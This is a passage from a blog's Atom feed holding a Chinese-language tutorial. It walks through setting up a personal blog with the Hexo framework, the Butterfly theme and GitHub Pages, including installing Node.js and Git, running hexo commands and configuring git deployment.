    <link href="http://touristdaughter.cyou/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
    <id>http://touristdaughter.cyou/2024/04/05/%E5%88%A9%E7%94%A8%E5%BC%80%E6%BA%90%E7%9A%84Hexo%E6%A1%86%E6%9E%B6+Butterfly%E4%B8%BB%E9%A2%98+Github%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</id>
    <published>2024-04-05T14:53:31.724Z</published>
    <updated>2024-04-06T12:54:13.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站"><a href="#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站" class="headerlink" title="利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站"></a>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</h1><blockquote><p>本文目的是供<code>互联网IT业界伙伴们</code>和<code>对前端感兴趣的朋友们</code>使用Github仓库的静态资源搭建个人博客网站。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/688070849%E3%80%81https://juejin.cn/post/6844904039457488910%E3%80%82">https://zhuanlan.zhihu.com/p/688070849、https://juejin.cn/post/6844904039457488910。</a></p></blockquote><p>步骤：</p><h1 id="一、本地配置"><a href="#一、本地配置" class="headerlink" title="一、本地配置"></a>一、本地配置</h1><h2 id="1-安装Node-js"><a href="#1-安装Node-js" class="headerlink" title="1.安装Node.js"></a>1.安装Node.js</h2><p>(1).首先去官网下载，自己利用搜索引擎搜索<code>nodejs官网</code>，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://nodejs.org/en%EF%BC%8C%E7%9B%B4%E6%8E%A5%E9%80%89%E6%8B%A9LTS%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E3%80%82">https://nodejs.org/en，直接选择LTS版本安装。</a></p><p>(2).下载完成后直接双击打开安装，基本上全部下一步就行。</p><p>(3).一般情况下，安装时默认安装在C盘，我们可以改一下安装位置，改到D盘<code>D:\nodejs\</code>。最后点击<code>Install</code>耐心的等待安装完成即可。</p><p><code>Win</code>键+<code>R</code>键打开运行窗口并输入<code>cmd</code>，如果打不开就按一下<code>F9</code>键。输入cmd打开命令行窗口之后输入<code>node -v</code>,出现版本号即为安装成功；反之，重新安装nodejs。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：</p><p><img src="/img/boke1.png"></p><p><img src="/img/boke2.png"></p><p><img src="/img/boke3.png"></p><p><img src="/img/boke4.png"></p><p><img src="/img/boke5.png"></p><p><img src="/img/boke6.png"></p><h2 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h2><p>打开Git官网下载页面，自己利用搜索引擎搜索官网，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，选择自己系统进行下载。</p><p><img src="/img/boke7.png"></p><p><img src="/img/boke8.png"></p><p>下载完成后，直接全程下一步进行安装，步骤有点多，我就不一步步贴图了。（建议也安装在其他盘，不要安装在C盘）</p><p>安装好后，打开cmd打开命令行窗口，输入<code>git --version</code> ,出现版本号则说明安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p>此时我们回到桌面，点击鼠标右键就会出现:<code>Open Git Bush here</code>, 如果没有就点击<code>更多</code>或<code>显示更多选项</code>即可看见。</p><p><img src="/img/boke9.png"></p><h2 id="3-安装配置Hexo"><a href="#3-安装配置Hexo" class="headerlink" title="3.安装配置Hexo"></a>3.安装配置Hexo</h2><p>(1).安装hexo</p><p>首先，我们建立一个文件夹 比如在D盘建立一个Hexo_blog文件夹，建立好后打开文件夹，点击鼠标右键点击<code>在终端中打开</code></p><p><img src="/img/boke10.png"></p><p>然后输入以下命令行下载安装Hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>(2).初始化</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>在终端中打开</code>，输入以下命令行进行初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Hexo_blog</span><br></pre></td></tr></table></figure><p>命令执行完成后，将在Hexo_blog文件夹中生成相应的文件，目录如下：</p><p><img src="/img/boke11.png"></p><p>(3).本地部署</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>Open Git Bush here</code></p><p>紧接着输入以下命令生成静态页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>输入以下命令启动server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>打开浏览器，输入网址: <a href="http://localhost:4000/">http://localhost:4000</a> ，即可看到hexo生成的静态页面。</p><p><code>Ctrl</code>建+点击鼠标左键点一下生成的链接，即可自动从浏览器打开Hexo生成的静态页面。</p><p>如果打不开，需重置端口。谷歌一下，即可搜到解决方案。</p><p>接着输入 <code>npm install</code> 安装所需要的文件。</p><h1 id="二、挑选并应用主题"><a href="#二、挑选并应用主题" class="headerlink" title="二、挑选并应用主题"></a>二、挑选并应用主题</h1><p>默认的主题可能并不是我们想要的效果，那么就可以通过更换主题来实现。可以在官网的主题页面选择想要的主题。这里，选择Butterfly主题来应用。</p><h2 id="1-主题安装"><a href="#1-主题安装" class="headerlink" title="1.主题安装"></a>1.主题安装</h2><p>可通过以下命令安装主题:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><h2 id="2-配置butterfly主题"><a href="#2-配置butterfly主题" class="headerlink" title="2.配置butterfly主题"></a>2.配置butterfly主题</h2><p>接着我们打开hexo_blog文件夹下的<code>_config.yml</code>配置文件</p><p><img src="/img/boke12.png"></p><p>点开，拉到最下面，找到这个配置，并把它改成<code>butterfly</code></p><p><img src="/img/boke13.png"></p><p>此时我们再去Git Bash命令窗口执行 <code>hexo g</code> 和 <code>hexo s</code> 命令。</p><p>发现会报一个错 <code>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</code>，这是因为此时我们的项目还缺少依赖，把hexo_blog文件夹在终端打开执行下面的命令安装:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus</span><br></pre></td></tr></table></figure><p>安装完成后再次执行 <code>hexo g</code> 和 <code>hexo s</code> 命令重新打开我们的项目就会发现，butterfly主题已经配置成功。</p><p>如果需要配置其他主题，可以到hexo主题网站去找。（建议选择支持中文的，后期好改）</p><h1 id="三、部署到Github仓库"><a href="#三、部署到Github仓库" class="headerlink" title="三、部署到Github仓库"></a>三、部署到Github仓库</h1><h2 id="1-新建github仓库"><a href="#1-新建github仓库" class="headerlink" title="1.新建github仓库"></a>1.新建github仓库</h2><p>打开我们的GitHub（没有账号的话，先去注册一个） <a href="https://github.com/">https://github.com/</a> 。<br>注册登录好后，点击右上角我们的头像，新建一个仓库</p><p><img src="/img/boke14.png"></p><p><img src="/img/boke15.png"></p><p>命名为 <code>username.github.io</code>（username是你的账号），这里要注意。还有就是新建的仓库一定要选择为<code>Public</code>，并且要勾选<code>Add a README file</code>不然待会我们的项目是访问不了的。点击下方按钮确认创建仓库。<br><img src="/img/boke16.png"></p><h2 id="2-配置hexo部署插件内容"><a href="#2-配置hexo部署插件内容" class="headerlink" title="2.配置hexo部署插件内容"></a>2.配置hexo部署插件内容</h2><p>首先确保安装了 hexo-deployer-git 插件（一般是没有的），如果没有，需要执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>安装插件（待会本地项目生成静态文件部署到github需要执行命令）</p><p>接着打开我们hexo博客项目的配置文件<code>_config.yml</code> ，在最底部找到<code>deploy</code>配置项，修改成下面的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"> type: git</span><br><span class="line"> repo: git@github.com:username/username.github.io.git #username是你的账号名，username.github.io是你的仓库名</span><br><span class="line"> branch: main #现在github默认是main分支</span><br></pre></td></tr></table></figure><p>github默认branch是<code>main</code>分支，如果出问题了，此处的<code>main</code>就要改成<code>master</code>，对应的GitHub仓库<code>Setting</code>里的branch里面的<code>main</code>也要改成<code>master</code>。</p><p>图片演示（可跳过）：<br><img src="/img/boke17.png"></p><p>返回Git Bash命令行窗口，依次执行以下代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate （可以简化成 hexo g ）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy （可以简化成 hexo d ）</span><br></pre></td></tr></table></figure><p>将hexo_blog里面的<code>public</code>文件提交到GitHub即可。</p><p>然后浏览器中输入 <code>你的GitHub用户名.github.io</code> 即可看到刚刚部署的博客，如果没有出现的话，可以稍微等一会延迟。</p><h1 id="至此，Hexo-Butterfly-Github搭建博客就大功告成了！"><a href="#至此，Hexo-Butterfly-Github搭建博客就大功告成了！" class="headerlink" title="至此，Hexo+Butterfly+Github搭建博客就大功告成了！"></a>至此，Hexo+Butterfly+Github搭建博客就大功告成了！</h1><h1 id="You-success"><a href="#You-success" class="headerlink" title="You success!"></a>You success!</h1><p>顺便说一下，如果需要绑定域名配置的话，请自行利用谷歌搜索引擎搜索，善于利用搜索引擎检索并解决问题是每一个程序员的必备技能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot;&gt;&lt;a href=&quot;#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot; class=&quot;headerlink&quot; title=&quot;利用开源</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="http://touristdaughter.cyou/tags/GitHub/"/>
    
    <category term="Butterfly" scheme="http://touristdaughter.cyou/tags/Butterfly/"/>
    
    <category term="Domain" scheme="http://touristdaughter.cyou/tags/Domain/"/>
    
  </entry>
  
</feed>
